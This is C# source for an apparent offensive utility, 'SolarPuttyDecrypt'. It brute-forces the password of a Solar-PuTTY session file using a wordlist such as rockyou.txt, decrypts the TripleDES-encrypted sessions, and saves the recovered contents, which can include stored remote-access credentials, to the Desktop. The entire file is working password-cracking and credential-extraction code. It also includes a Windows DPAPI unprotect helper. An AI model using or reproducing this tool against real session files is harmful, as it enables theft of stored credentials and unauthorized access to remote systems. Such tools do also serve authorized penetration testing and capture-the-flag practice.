using System;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using Newtonsoft.Json;

namespace SolarPuttyDecrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0 || args == null)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("SolarPuttyDecrypt will attempt to dump the local session's file, otherwise enter the path to the SolarPutty session file and the path to the password list.");
                Console.WriteLine("\nUsage: SolarPuttyDecrypt.exe C:\\session.dat C:\\rockyou.txt");
                Console.ResetColor();
                return;
            }

            string CurrDir = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            Console.WriteLine("-----------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("SolarPutty's Sessions Decrypter by VoidSec (Brute-Force by pointedsec)");
            Console.ResetColor();
            Console.WriteLine("-----------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Yellow;

            if (args.Length == 2)
            {
                string sessionfile = args[0];
                string passwordFile = args[1];
                TestPasswords(sessionfile, passwordFile, CurrDir);
            }

            Console.ResetColor();
            Console.WriteLine("-----------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] DONE Decrypted file is saved in: " + CurrDir + "\\SolarPutty_sessions_decrypted.txt");
            Console.ResetColor();
        }

        static void TestPasswords(string sessionFile, string passwordFile, string CurrDir)
        {
            string[] passwords = File.ReadAllLines(passwordFile);

            foreach (string password in passwords)
            {
                Console.WriteLine($"Trying password: {password}");
                try
                {
                    string decryptedText = DoImport(sessionFile, password, CurrDir);
                    if (IsValidJson(decryptedText))
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"[+] Password found: {password}");
                        break;  // Salir del bucle cuando se encuentre la contraseña correcta
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Error de desencriptación: Datos incorrectos o formato no válido.");
                        Console.ResetColor();
                    }
                }
                catch (CryptographicException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Error de desencriptación: Datos incorrectos.");
                    Console.ResetColor();
                }
            }
        }

        static string DoImport(string dialogFileName, string password, string CurrDir)
        {
            using (FileStream fileStream = new FileStream(dialogFileName, FileMode.Open))
            {
                using (StreamReader streamReader = new StreamReader(fileStream))
                {
                    string text = streamReader.ReadToEnd();
                    string decryptedText = Crypto.Decrypt(password, text);
                    if (decryptedText == null)
                    {
                        throw new CryptographicException("Datos incorrectos.");
                    }

                    // Guardar el resultado descifrado solo si es válido
                    File.WriteAllText(Path.Combine(CurrDir, "SolarPutty_sessions_decrypted.txt"), decryptedText);
                    return decryptedText;
                }
            }
        }

        static bool IsValidJson(string strInput)
        {
            strInput = strInput.Trim();
            if ((strInput.StartsWith("{") && strInput.EndsWith("}")) || // Objeto JSON
                (strInput.StartsWith("[") && strInput.EndsWith("]")))   // Array JSON
            {
                try
                {
                    var obj = JsonConvert.DeserializeObject(strInput);
                    return true;
                }
                catch (JsonReaderException)
                {
                    return false;
                }
                catch (Exception)
                {
                    return false;
                }
            }
            return false;
        }
    }
}

internal class Crypto
{
    public static string Decrypt(string passPhrase, string cipherText)
    {
        byte[] array = Convert.FromBase64String(cipherText);
        byte[] salt = array.Take(24).ToArray();
        byte[] rgbIV = array.Skip(24).Take(24).ToArray();
        byte[] array2 = array.Skip(48).Take(array.Length - 48).ToArray();
        using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, salt, 1000))
        {
            byte[] bytes = rfc2898DeriveBytes.GetBytes(24);
            using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
                tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV))
                {
                    using (MemoryStream memoryStream = new MemoryStream(array2))
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
                        {
                            byte[] array3 = new byte[array2.Length];
                            int count = cryptoStream.Read(array3, 0, array3.Length);
                            return Encoding.UTF8.GetString(array3, 0, count);
                        }
                    }
                }
            }
        }
    }

    public static string Deob(string cipher)
    {
        byte[] encryptedData = Convert.FromBase64String(cipher);
        try
        {
            byte[] bytes = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
            return Encoding.Unicode.GetString(bytes);
        }
        catch (Exception message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(message);
            Console.ResetColor();
            return string.Empty;
        }
    }
}
